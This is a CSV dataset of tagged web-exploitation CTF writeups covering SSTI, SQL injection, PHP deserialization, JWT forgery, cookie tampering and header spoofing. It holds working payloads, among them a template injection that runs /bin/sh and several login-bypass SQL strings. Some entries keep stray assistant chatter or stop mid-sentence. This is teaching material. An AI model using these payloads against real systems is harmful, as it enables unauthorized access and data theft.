"filename","category","text"
"02_Spookifier_tagged.txt","Web Exploitation","Title: Server Side Template Injection in Flask App
Primary topic: Web Exploitation
Secondary topic: Server Side Template Injection
Tools used: None
Keywords: flask, mako, font, SSTI

#context
Navigating to website, we are presented with the following page.

#discovery
On giving an input, it is sent through get parameter and it reponds with same input with different font styles.

#context
Looking into the source code reveals that its a flask app and using mako template engine for rendering. On line 11, the user input is passed into the spoofiky function and its output is passed into the template.

#code
Tracing the spookify function, it passes the text onto change_font function which just maps the text characters againts different font dictionaries. One font dictionary does not have any unique character for mapping.

#exploitation
Since, the user input is directly passed into the template with any sanitization, this introduces the Server Side Template Injection (SSTI). We confirm it by using the following payload and it sucessfully evaluates it.

#code
{{7*7}}

#exploitation
Then using the following payload, we can run commands on the system and read our flag. 

#code
{{''.__class__.__mro__[1].__subclasses__()[414]('/bin/sh',shell=True,stdout=-1).communicate()[0].strip()}}
"
"03_Horror Feeds_tagged.txt","Web Exploitation","Title: SQL Injection in Login Page
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: CCTV footage, docker, SQL injection, ON DUPLICATE KEY UPDATE, bcrypt

#context
Starting the challenge container, we are presented with the following login page which also presents option to register.

#discovery
Looking into the provided zip file, there's the docker startup script which creates the users table and adds the admin user entry. The password is hashed.

#context
Registering the new user and logging in, on the home page it shows spooky CCTV footage as told in the challenge description. There's nothing more.

#context
Then, this flag and authenticated username is passed into the dashboard template. But, we saw the dashboard after but there was no flag. The reason is that there's a condition in the template that flag will only be rendered when admin logs into the dashboard. This means that we need to be admin to get the flag.

#exploitation
Looking in the register function, the username is directly passed to the SQL query without any sanitization. This introduces the SQL injection. First query on line 30 doesn't concern us because the passwords are hashed and we already have hash of admin password but it's of no use. But the second query of line 36 is interesting. Since this is an insert query and there's no input validation, we can use it to change the admin's password hash to our own generated hash. This can be done by using the ON DUPLICATE KEY UPDATE which is an extension to insert statement that, if it finds a duplicate unique or primary key, it will instead perform an update.

#code
So, the logic is to try to add admin user which we know already exists in the table, so on duplicate key, we can change its hash. You can read more about it on the following page:

#code
https://dev.mysql.com/doc/refman/8.0/en/insert-on"
"04_Juggling_Facts_tagged.txt","Web Exploitation","Title: Type Juggling in GetFacts Endpoint
Primary topic: Web Exploitation
Secondary topic: PHP
Tools used: Burp Suite
Keywords: type juggling, switch statements, loose comparison

#context
Opening the challenge website, we get the following page. It presents three buttons on the right to see other facts.

#discovery
Clicking on secret facts, it says, can only be accessed by admin. Looking at the Burp Suite proxy, under the hood, it is sending a post request to the getfacts endpoint with the fact type parameter.

#code
Looking into the source code, the getfacts endpoint is controlled by the getfacts function. The getfacts function basically has two main things. First, there's an if statement that checks if the request fact type is secret and the request is not coming from localhost, then return the message that we saw earlier in the response. Second, there's a switch statement which checks the type and returns the facts.

#exploitation
The switch statements in PHP use loose comparison (==). By providing the true keyword in the type parameter, the first switch case becomes true and presents the secrets and the flag.

#countermeasures
This challenge demonstrates the importance of proper input validation and sanitization to prevent vulnerabilities such as type juggling. It also highlights the need for secure coding practices and the use of strict comparison (===) in switch statements."
"05_Cursed_Secret_Party_tagged.txt","Web Exploitation","Title: XSS in Halloween Form
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: Burp Suite, GitHub, Webhook.site
Keywords: CSP, JWT, cookie

#context
Starting the challenge, we get the following page which presents a form. Submitting the form, it says that request will be reviewed by team. Looking into the burpsuite proxy, it is posting data to the submit endpoint. Tracing into the source code, this endpoint adds the post data in the database and calls a visit function from bot. The other endpoint is /admin which gets the data from db and passes it into the admin template and /admin/delete_all endpoint deletes all the data from db.

#discovery
Looking into the visit function which is called when we submit the form. It first creates a headless browser and it signs and sets an admin JWT which contains flag. This gives the idea that we need to steal this admin cookie. Then it visits the /admin page which displays all the data from db and then it calls delete_all endpoint which deletes all data from db.

#exploitation
Now, that we know that we need to steal admin cookie and also the admin is rendering the user input data, we can perform XSS to grab the cookie. Looking in the admin template which displays the form data to admin, the halloween name field is marked safe which means it will not escape character, so we can inject our js code in it. But the problem is that it has a CSP header which we need to bypass for our XSS to work. Understanding the CSP that script source is set to self and jsdelivr CDN which means it will only trust JS"
"01_Get_aHEAD_tagged.txt","Web Exploitation","Title: Get aHEAD
Topics: Web Exploitation, Information Gathering
Vulnerabilities: Improper use of HTTP request methods
Tools used: Burp Suite
Keywords: HTTP method, HEAD, MDN Web Docs

#context
Looking at the HTML of the website, we can see that both red and blue buttons make a request to the same URL, however with different HTTP request methods. We can make the educated guess that the flag will be accessible by using a different HTTP request method.

#discovery
Using the tool Burp Suite, we can try HTTP requests with different request methods. Unfortunately, both ""PUT"" and ""DELETE"" do not result in the flag. Looking at the MDN Web Docs, we can see that there are actually 9 different HTTP request methods, one of which being ""HEAD"".

#exploitation
As this challenge is named ""Get aHEAD"", we can conclude that we must use the ""HEAD"" method to get the flag.
"
"02_Cookies_tagged.txt","Web Exploitation","Title: Cookies
Topics: Web Exploitation, Cookie Manipulation
Vulnerabilities: Session hijacking
Tools used: Browser extension
Keywords: cookie

#context
We visit the website and see the following message: ""Welcome to my cookie search page. See how much I like different kinds of cookies!""

#discovery
Let's check the cookie we get from the server.

#exploitation
What if we try to access with a different cookie name? I use a browser extension to modify the cookie.

#discovery
Let's search for that special cookie by trying different numbers in the name.
"
"03_Insp3ct0r_tagged.txt","Web Exploitation","Title: Insp3ct0r
Topics: Web Exploitation, Information Gathering
Vulnerabilities: Improper Access Control, Information Leakage
Tools used: Developer Tools
Keywords: HTML, CSS, JavaScript, inspect

#context
Visiting the website, we don't see anything out of the ordinary.

#discovery
We right click and choose to inspect the source code.
Here we get the first third of the flag, included as a html comment.
The second part of the flag comes from the referenced CSS file mycss.cs.
The last part comes from the Javascript scipt myjs.js.

#exploitation
Hence combining the 3 parts gives the flag.
"
"05_Some_Assembly_Required_1_tagged.txt","Web Exploitation","Title: Some Assembly Required 1
Topics: Web Exploitation, Information Gathering
Vulnerabilities: Improper Access Control, Information Leakage
Tools used: Developer Tools
Keywords: JavaScript, WebAssembly, path

#context
Upon visiting the website, it appears to just be a textbox with a form.

#discovery
After inspecting the website, I can see there's a JavaScript file. I inspect that file.
The first time I looked at it I gave up in 5 seconds. Anyways, in the const declaration one of the elements caught my attention. There is a path.
I visited that path and it gave a WebAssembly file.
At the bottom of the file, there was the flag.
"
"06_More_Cookies_tagged.txt","Web Exploitation","Title: More Cookies
Topics: Web Exploitation, Cryptography, Cookie Manipulation
Vulnerabilities: Cryptographic Flaws, Session hijacking
Tools used: Python script
Keywords: cookie, homomorphic encryption, CBC bitflip, admin

#context
Looking at the website, we deduce this is a continuation of the ""Cookies"" challenge. So let's have a look. This time the page reads: ""Welcome to my cookie search page. Only the admin can use it!"".

#discovery
Let's check the cookie we get from the server and we notice it's encoded. It's a base64 encoding but when I decode it, it's still in gibberish, So it's encrypted.

#context
Let's see the Hint 1: it links to a Wikipedia page for a very interesting encryption method (homomorphic encryption). It's more like an algorithm than an encryption formula.

#discovery
Reading articles about the homomorphic encryption and looking at other writeups I understand that we do not have to decrypt it to solve it, indeed this encryption allows you to perform operations on encrypted text.
Also, I noticed that the letters ""CBC"" are oddly capitalized in the challenge description. So, It's a CBC bitflip.

#exploitation
Meaning the encrypted text contains a bit that determines if it's admin or not. Probably something like admin=0 but I don't know its position, so I brute-forced it using a python script.
"
"07_where_are_the_robots_tagged.txt","Web Exploitation","Title: where are the robots
Topics: Web Exploitation, Information Gathering
Vulnerabilities: Misconfigured Web Server, Information Leakage
Tools used: Developer Tools
Keywords: robots.txt

#context
Once we open the link, we are greeted with a seemingly basic website. The title of the problem suggests to look for a robots.txt file.

#discovery
A robots.txt file is a text file that blocks automatic web robots from running. A common mistake people make is they put secret information in files listed in the robots.txt file. When we look for this file we see a directory excluded.

#exploitation
By going to that we see the flag.
"
"08_logon_tagged.txt","Web Exploitation","Title: logon
Topics: Web Exploitation, Cookie Manipulation
Vulnerabilities: Session hijacking
Tools used: Developer tools
Keywords: cookie, admin

#context
No matter what credentials we use for the login, it successfully logs us in, but doesn't give us the flag. 

#discovery
This suggests that a cookie might be used to store a separate variable that might be preventing us from seeing the flag.
We open the cookie and we notice an admin variable set to False.

#exploitation
Changing this to True and refreshing the page gives us the flag.
"
"09_dont-use-client-side_tagged.txt","Web Exploitation","Title: dont-use-client-side
Topics: Web Exploitation, Information Gathering, Client-side Validation
Vulnerabilities: Information Leakage
Tools used: Bash script, Developer Tools
Keywords: client side, check, credentials

#context
Opening the website greets us with a login page, requiring credentials.

#discovery
As referenced by the challenge name, we assume that the check for the validity of the credentials is checked client side, and hence can be reversed to obtain the correct password.
The first obvious thing to do as nothing else is look at the page source code hoping to find anything important. And boom, we win the lottery!

#exploitation
We got that the password is checked split in parts against the flag itself divided in parts.
We use a bash script to join them together and obtain the flag.
"
"10_It_is_my_Birthday_tagged.txt","Web Exploitation","Title: It is my Birthday
Topics: Web Exploitation, Cryptography, Cookie Manipulation
Vulnerabilities: Cryptographic Flaws
Tools used: Python script
Keywords: MD5, hash collision, PDF

#context
We have a website with the possibility to upload two PDF files. The description of the challenge states: ""I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website."".

#discovery
So, we're dealing with a hash collision problem. Nowadays it's trivial to generate an MD5 collision of two images/PDF files. Take any two PDFs of different contents, we can make them have the same MD5 hash. I used a Python script to generate two PDFs with the same MD5 hash.

#exploitation
After we've generated the two colliding PDFs, we uploaded them, and the website redirected to the source code.
The flag can be found in a comment at the end of the code, at line 37.
"
"11_Who_are_you_tagged.txt","Web Exploitation","Title: Who are you
Topics: Web Exploitation, HTTP Headers
Vulnerabilities: Spoofing
Tools used: Postman, cURL, Burp Suite
Keywords: HTTP header, User-Agent, Referer, Date, DNT, X-Forwarded-For, Accept-Language

#context
When we visit the site, it says: ""Only people who use the official PicoBrowser are allowed on this site!""""

#discovery
There are many ways to approach this, I ended up using Postman's HTTP request, but some alternatives are cURL and Burp Suite.

#exploitation
We'll unhide requests and override the default User-Agent request with a PicoBrowser agent. Now the site says: ""I don't trust users visiting from another site."".
So, we need to make the HTTP header show it's from the same site. We'll use Referer header. Now, it says: ""Sorry, this site only worked in 2018."".
We'll use the Date header with any value from 2018. Now, it says: ""I don't trust users who can be tracked."".
We can set the DNT header which means ""do not track"" to 1 (true). Now, it says: ""This website is only for people from Sweden."".
We can use the X-Forwarded-For header which will change the originating IP address. Grab any random IP address from Sweden. Now, it says: ""You're in Sweden but you don't speak Swedish?"".
We can use the Accept-Language header to specify which languages are ok. We can look through a list of languages and find Sweden's subtag is `sv`.
At the end, we get the flag.
"
"12_login_tagged.txt","Web Exploitation","Title: login
Topics: Web Exploitation, Information Gathering, Client-side Validation
Vulnerabilities: Information Leakage
Tools used: Developer Tools
Keywords: base64, encode, decode

#context
On first inspection, we faced with a login screen.

#discovery
It seems like SQL injection, because ""isn't that what always happens with logins in CTFs?"". However, it's a lot simpler than that. After navigating to the website source, we encounter a .js file. After a pretty printing, it's just vanilla JavaScript.
The important part of the code is in line 12, where it's checking for a username and password that has been turned into base64 from ASCII via the `btoa()` method, which is reversible with the `atob()` method. The password itself is the flag when decoded.

#exploitation
Opening the Chrome console and undoing the encoding, results in the flag. If you're not convinced it's the real flag, you can decode the username (admin) and input both into the login form, which results in an alert announcing the flag.
"
"15_Local_Authority_tagged.txt","Web Exploitation","Title: Local Authority
Topics: Web Exploitation, Information Gathering, Client-side Validation
Vulnerabilities: Information Leakage
Tools used: Developer Tools
Keywords: JavaScript, PHP, CSS

#context
When you go to the website, you find a login screen.

#discovery
To find out more about the inner workings of the website, we look at the source code (right-click on the page). Nothing visible at first sight. We dive deeper and look at PHP, JavaScript and CSS files.
Surprisingly, some of the source codes in the `login.php` are shown to us. This is because the logic that is handling our login credentials is in the Javascript function in HTML that is echoed to us. The function `filter()` obviously checks if the entered field contains only allowed letters. The JavaScript code following the function definition reads the entered values and passes them on to a function called `checkPassword()` which is not defined in this document. Since we are looking for JavaScript code, we look into `secure.js`.

#exploitation
Okay, that was not difficult. The login credentials for the website are here. If we copy the password, go back to the login screen, enter the password together with the username, we get the flag.
"
"17_Some_Assembly_Required_2_tagged.txt","Web Exploitation","Title: Some Assembly Required 2
Topics: Web Exploitation, Reverse Engineering
Vulnerabilities: Cryptography Flaws, Information Leakage
Tools used: Developer Tools, Python, CyberChef
Keywords: JavaScript, WebAssembly, XOR

#context
Upon visiting the website, it appears to just be a text-box with a form.

#discovery
After inspecting the website, I can see there's a JavaScript file. I inspect that file. The first time I looked at it I gave up in 5 seconds. Anyways, in the const declaration one of the elements caught my attention. There is a path. I visited that path and it gave a WebAssembly file.
Until now, it's all identical to the last challenge, except that a slightly different bas64 wasm string is downloaded. Using a Python script I converted the string to an actual wasm file. I translate the wasm file to wat file, then I translate it to pseudo code and analyze the result. Note that this is not C code, it is C-like code. When compared with the decompiled wasm code for the previous challenge, only some lines are new/changed at the end of the `copy` function. So we can assume that the magic happens in the `copy`. We can see that this new version includes some extra logic.

#exploitation
What seems to be happening here is that the characters from the flag are getting XORed with 8 before being saved at offset 1072+. We can also see that the string that `check_flag()` uses to compare the user input to the expected flag (at offset 1024+) doesn't contain the flag in clear anymore. I copied the variable content which can be seen from the decoded base64 text into CyberChef. I used the magic block to search for `picoCTF` and sure enough it found the flag. Apparently, the decoding is a XOR with 8.
"
"18_Super_Serial_tagged.txt","Web Exploitation","Title: Super Serial
Topics: Web Exploitation
Vulnerabilities: Deserialization, Object Injection
Tools used: Developer Tools, CyberChef
Keywords: cookie, PHP, deserialization, base64

#context
Going to the robot file, we notice that `admin.phps` is disallowed. This indicates that the phps extension is enabled within the php configuration for this webserver. Files with the phps extension contain php code but instead of running when they are accessed, they return an HTML representation of the literal php code. ""phps"" stands for ""PHP source"".

#discovery
We can access `index.phps` code, that points us in the direction of `authentication.php`. Looking at the code, it points us in the direction of `cookie.php`. We look at its code.
OK. A few things to note here. The `cookie.php` file is included in every page. In it we have a code segment that will deserialize our cookie and print the object when an error occurs: `(""Deserialization error. "".$perm)`.
I start thinking we are in the context of a deserialization vulnerability.

#exploitation
We can store any object in the cookie and it will be unserialized. One option is to exploit the `__construct` function, since this is ran immediately when the object is created. However, in both the access_log and permissions classes, there does not appear to be a valid gadget chain.

#discovery
Conveniently, the `access_log` class in `authentication.php` has the `__toString()` method, that is one of the PHP magic methods that override PHP's default behaviour. This method is called when the object is converted to a string. So if we could get the above `$perm` variable to be our custom `access_log` object, we could achieve arbitrary file read on the target system.
To do this, we simply serialize our custom `access_log` object, where we set `log_file` to `../flag`. The php serialized `access_log` object looks like this: ```O:10:""access_log"":1:{s:8:""log_file"";s:7:""../flag"";}```. Fore more details about this syntax, we can search for ""exploiting php deserialization"" on Google.

#exploitation
Let's encode that to base64 and url encode it using CyberChef.
Now, we can add it as the `login` cookie on our browser and go to `authentication.php`. Note that we need to use `authentication.php` because that is the file where the required `access_log` class is defined. Our custom `access_log('../flag')` object will be deserialized into `$perm`. This will most definitely generate an error because the `access_log` class has no such methods. This will catch the error and concatenate `$perm` to the `""Deserialization error. ""` string. In doing so, `$perm` is converted to a string. This invokes the `__toString()` method which reads `../flag`!
"
"19_Most_Cookies_tagged.txt","Web Exploitation","Title: Most Cookies
Topics: Web Exploitation, Information Gathering, Cookie Manipulation
Vulnerabilities: Session Hijacking, Information Leakage
Tools used: Developer Tools, Python script, CyberChef, Burp Suite
Keywords: hardcoded, bruteforce, cookie, admin

#context
Let's visit the site. And analyze the source code. The `/display` page checks the session cookie. From this, it is clear we need to become admin to swipe that flag!

#discovery
We need to change the `very_auth` session value to `admin` somehow. Looking at the server script (`server.py`) code, we can see that the Flask session secret key is hardcoded into the source code! This key is set to a random cookie name. This secret key is used to sign a flask session cookie so that it cannot be modified. However, since we know the secret key is one of the 28 cookie names, we can simply try them all until we successfully decrypt the cookie. We use a Python script to bruteforce each secret in the wordlist.
So, the first step is to go to the website and copy a valid session cookie. Use our old friend Developer Tools: `Inspect > Application > Storage > Cookies`. Let's use CyberChef to decode that cookie value (it was base64 encoded). We observe that the header is `{ ""very_auth"": ""blank"" }`. Yikes. We want to be `admin` instead of `blank`.

#exploitation
Putting this new crafted cookie back into Burp Suite, we get the flag in the response.
"
"20_caas_tagged.txt","Web Exploitation","Title: caas
Topics: Web Exploitation
Vulnerabilities: Command Injection
Tools used: None
Keywords: command, injection

Visiting the attached website, we see a page implementing cowsay as a service.
In an attempt to exploit potential vulnerabilities, we try to inject a command by appending it with a semicolon after the current command. This technique is commonly known as command injection and can allow unauthorized commands to be executed on the server.
"
"21_Some_Assembly_Required_3_tagged.txt","Web Exploitation","Title: Some Assembly Required 3
Topics: Web Exploitation, Reverse Engineering
Vulnerabilities: Cryptography Flaws, Information Leakage
Tools used: Developer Tools, Python, diff, CyberChef
Keywords: JavaScript, WebAssembly, XOR

#context
Upon visiting the website, it appears to just be a text-box with a form. After inspecting the website, I can see there's a JavaScript file. I inspect that file. The first time I looked at it I gave up in 5 seconds. Anyways, in the const declaration one of the elements caught my attention. There is a path. I visited that path and it gave a WebAssembly file.

#discovery
Like the last challenge, a bas64 wasm string is downloaded. Using a Python script I converted the string to an actual wasm file. I translate the wasm file to wat file, then I translate it to pseudo code and analyze the result. Note that this is not C code, it is C-like code. We use diff to compare the new wasm with the wasm from the previous challenge. We can see that this new version includes some extra logic. We see the addition of a new variable, named `key`, and some changes at the end of the `copy_char`.

#exploitation
We discover that the flag is XORed with the reverse of the key. I'm not sure why the key needs to be reversed, but it could have something to do with big endian and little endian since wasm is close to machine code.
An alternative way to find the key is as follows.
We know (from step 6) that the key is 5 bytes. We also know that the flag starts with `picoCTF{`. Thus, we can XOR the start of the flag (`picoC`) with the encrypted flag `0x9d, 0x6e, 0x93, 0xc8, 0xb2` to find that they key is: `0xed 0x07 0xf0 0xa7 0xf1`.
The latter logic comes from the XOR cipher: if `ciphertext = plaintext XOR key` then `ciphertext XOR plaintext = key`.
Translating this logic to a Python script we get the flag.
"
"22_Web_Gauntlet_2_tagged.txt","Web Exploitation","Title: Web Gauntlet 2
Topics: Web Exploitation
Vulnerabilities: SQL Injection
Tools used: None
Keywords: login form, filter, username, password, SQL injection, admin

#context
The attached website gives us a standard login form. If we enter credentials we even get the SQL query run on the server. So we can deduce the site is vulnerable to SQL injection.

#discovery
Looking at the filter link we can see what we must avoid when crafting our SQL injection. According to `filter.php` the application filters are the following: `or and true false union like = > < ; -- /* */ admin`.

#exploitation
We know that the username field must be ""admin"", but entering it as plaintext gets blocked, as we have seen. To bypass this we can simply use the `||` joiner (not filtered) with a final value for the username field of `ad'||'min`. For the password field we must simply provide something that returns true. The most common one used is `' OR '1'='1`, but `OR` is filtered as seen. Instead we can craft a true statement using `IS` or `IS NOT` such as `a' IS NOT 'b` which is also true. Using the final values of username and password for login we get the message ""Congrats! You won! Check out `filter.php`"".
Finally reloading the page gives us its source code with the flag.
"
"23_picobrowser_tagged.txt","Web Exploitation","Title: picobrowser
Topics: Web Exploitation, HTTP Headers
Vulnerabilities: Spoofing
Tools used: cURL
Keywords: HTTP header, User-Agent

#context
This website has a button you can press that will give you the flag. However, if you press it in your web browser, it will give you an error saying ""You're not picobrowser!"" and list some text after it that depends on your OS and browser.

#discovery
For me, it says: ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0, but yours will likely be different)"". That string of text is known as an User-Agent and it tells the server what browser you're using.

#exploitation
To convince them that you're running a ""picobrowser"", you can just change your User-Agent HTTP header To do this, I chose to use cURL because it easily allows you to control the headers.
"
"24_Client-side-again_tagged.txt","Web Exploitation","Title: Client-side-again
Topics: Web Exploitation, Information Gathering, Client-side Validation, Code Obfuscation
Vulnerabilities: Information Leakage
Tools used: Developer Tools, Python script
Keywords: client side, obfuscated, script

#context
We visit the website and inspect the source code. Let's call a JavaScript beautifier in order to make the JavaScript code a bit more readable.

#discovery
We see that `_0x4b5b` is a function used to obfuscate different values. It is calculated in runtime. Luckily, we can use the browser's Developer Tools console in order to evaluate the obfuscated function and read its values.
Let's replace the function calls with hardcoded values to improve readability.

#exploitation
So this is very similar to another challenge already seen, using `substring` to authenticate the password. Indeed we have some substrings composing the flag. Note that there are some overlaps. An evil way to turn this into a flag would be by transforming the JavaScript code into a Python array assignment script and executing it.
This gives us the flag at the price of allowing exec to slip into our code.
"
"28_Power_Cookie_tagged.txt","Web Exploitation","Title: Power Cookie
Topics: Web Exploitation, Information Gathering, Cookie Manipulation
Vulnerabilities: Session Hijacking
Tools used: Developer Tools
Keywords: cookie, admin

#context
As suggested by the challenge name, the solution likely involves changing a cookie value.

#discovery
If we go to the website, we find that there are no cookies saved. However, if we click the `continue as guest` button, we can see, using the Developer Tools that a cookie with the name `admin` is generated, with the value 0.

#exploitation
0 means `False` here, so if we change the cookie's value to 1 (`True`) and refresh, the website treats us like the admin, giving us the flag.
"
"29_Roboto_Sans_tagged.txt","Web Exploitation","Title: Suspicious robots.txt
Primary topic: Web Exploitation
Secondary topic: Base64 decoding
Tools used: None
Keywords: base64, suburl

#context
The challenge name seems to be either an allusion to the text font Roboto or /robots.txt.

#discovery
As investigating the text font files seems more complicated, let's first look at /robots.txt. The text in here disallow looks suspicious.

#code
The double equal sign suggests that it's base 64. However, if we try to decode it with an online decoder, it seems like the base 64 is a little malformed. As the base 64 text spans across three lines, it suggests that it is actually three separate strings.

#discovery
If we decode each line separately, we find that the second line gives us a valid path, specifically js/myfile.txt.

#exploitation
If we navigate to the suburl, we get the flag.
"
"30_Secrets_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Hidden Flag in CSS
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: secret, hidden, HTML source

#discovery
If we right click -> inspect and look at the sources tab, we find that some of the assets are in a suspiciously named folder called ""secret"".
If we navigate to the secret suburl, we find a website that says ""Finally. You almost found me. you are doing well"".

#discovery
We are on the right track. If we repeat the same process as before, we find that there is another suspiciously named folder, ""hidden"", so we navigate to it.

#discovery
We keep on repeating this process until we reach a website that says ""Finally. You found me. But can you see me"".

#countermeasures
The flag is probably hidden by the css. We can just look at the HTML source to get the flag.
```"
"31_SQL_Direct_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: PostgreSQL Flag Retrieval
Primary topic: Database Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: PostgreSQL, flag

#context
Let's connect to the PostgreSQL.

#discovery
Now, Let's run /dt to list the tables of the public schema.

#exploitation
Now let's run select command from flags table on public schema.

#code
And we get the flag.

#countermeasures
None.
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"32_X_marks_the_spot_tagged.txt","Web Exploitation","Title: X marks the spot
Primary topic: Web Exploitation
Secondary topic: XPATH Injection
Tools used: None
Keywords: XPATH, SQL injection

#context
Visiting the website, we are presented with a login form (and a Robert Frost poem).

#discovery
The hint says ""XPATH"", and using some common XPATH injection techniques we can leak some information about the underlying DB. The idea is similar to SQL injection. We have a vulnerable query for authenticating the username and password.

#exploitation
So, if we inject some valid XPATH vocabulary into the query, we can manipulate it. Experimenting with the query we can check if the password of the first username is longer than 1 character. If we submit this as the username, we get back a response from the server telling us that ""You're on the right path"", so we can deduce that password is longer than 1. In the same way, we can check that the password is shorter than 30 characters. Let's use the following syntax to iterate some users and check if someone's password starts with ""a"", ""b"", ""c"", etc. We can write a script that uses XPATH substring to brute force the password character by character.

#code
None

#countermeasures
None"
"33_notepad_tagged.txt","Web Exploitation","Title: notepad
Primary topic: Web Exploitation
Secondary topic: Directory Traversal
Tools used: None
Keywords: Flask, RCE

#context
We visit the website and get a note-taking application. After posting a note, the note contents get saved to a file on the server and we can visit it and view the note.

#discovery
Reviewing the code, we know"
"34_Irish-Name-Repo_1_tagged.txt","Web Exploitation","Title: Irish-Name-Repo 1
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: SQL database

#context
When we open the site, we see the content of the main page is not very helpful. When we look at the Support page however, we see an inquiry saying: ""Hi. I tried adding my favorite Irish person, Conan O'Brien. But I keep getting something called a SQL Error."" This tells us that the site uses a SQL database.

#exploitation
When we go to the Admin Login, we can try a basic SQL Injection to bypass the portal. Our injection is specifically having the username as ' OR 1=1-- and the password as whatever. What is happening here is the query checks if the username is equal to nothing. Then, it checks OR 1=1. Since 1 is always going to be equal to 1, this returns true. The -- at the end simply comments out the rest of the query. This fools the server into letting us through the portal.

#code
' OR 1=1--
"
"35_Web_Gauntlet_3_tagged.txt","Web Exploitation","Title: Web Gauntlet 3
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: username, password, filter.php

#context
The challenge is the exact same as Web Gauntlet 2 but we now have a 25 total character limit for our username and password field entry.

#code
```
username: ad'||'min
password: a' IS NOT 'b
```

#exploitation
After inputting these values for username and password we login and get the message ""Congrats! You won! Check out filter.php"".

#context
Reloading the filter.php file we get the source code for the challenge along with the flag in the comments just as for Web Gauntlet 2."
"36_JAuth_tagged.txt","Web Exploitation","Title: JAuth
Primary topic: Web Exploitation
Secondary topic: JWT Token
Tools used: None
Keywords: JWT, algorithm, signature

#context
We get a test user. If we log in, we get an empty page. Let's look at the login HTTP request. Hmmm... nothing interesting. If we get set Remember me on we get the same request. Let's check our cookies.

#discovery
This is a JWT token. A JWT is separated into three parts. The first is called a header and is being used for general information like the token type and algorithm, the second part is the payload (the info we want to store) and the last one is the signature which makes sure the token is valid. All the tokens parts are separated by a dot and are encoded in based64. Let's decode it.

#exploitation
We have a role part that is set to user. So we can just change it to admin and hippity hoppity your site is my property? Hell no. Doing that the signature will become invalid and you will just be logged out. So what can we do? Let's take a look at the token again. We can see that the token is holding the algorithm it used to verify itself on itself. It means that we can change the algorithm to none, and the token will just check for none algorithm on the signature. So let's do it, first let's change the header. Do the same for the payload (make sure you change it to admin), then add the header and the payload together separated by a dot and also add another dot at the end and don't add a signature at all. Just change the cookie and refresh, it will now log you as an admin!

#code
None

#countermeasures
None mentioned."
"37_SQLiLite_tagged.txt","Web Exploitation","Title: SQLiLite
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: SQL command, payload, flag

#context
Connecting to the website will give us a login form. In the hints, it is given that the user is ""admin"".

#discovery
We tried logging in with the credentials ""admin"" and ""admin,"" but it failed. We realized that the input we give is entering into the SQL command, so we have to use SQL injection techniques to exploit this.

#exploitation
We tried a common SQLi payload: `admin' or 1=1--`. This sets our own condition and passes the command. By adding "" -- "" we comment out the remaining part of the SQL command.

#discovery
Now we can see that we are logged in, but the flag is hidden.
We checked the source code of the page and found the flag.
"
"38_Irish-Name-Repo_2_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Irish-Name-Repo 2
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: blind SQLi, filter bypass

#context
This site looks a lot like the one from Irish-Name-Repo 1, yet once we try this same SQL Injection of ' OR 1=1-- here, we get nothing but a page that says SQLi detected.

#discovery
After some playing around, we can figure out that the filter detects several keywords, including UNION which was the solution for last year's SQLi filter challenge.

#exploitation
However, after some blind SQLi, we bypass the filter by setting the username to admin'-- and the password to whatever. We are guessing that the username here should be admin and then commenting out the rest so that the password is not checked.

#code
None

#countermeasures
None
```"
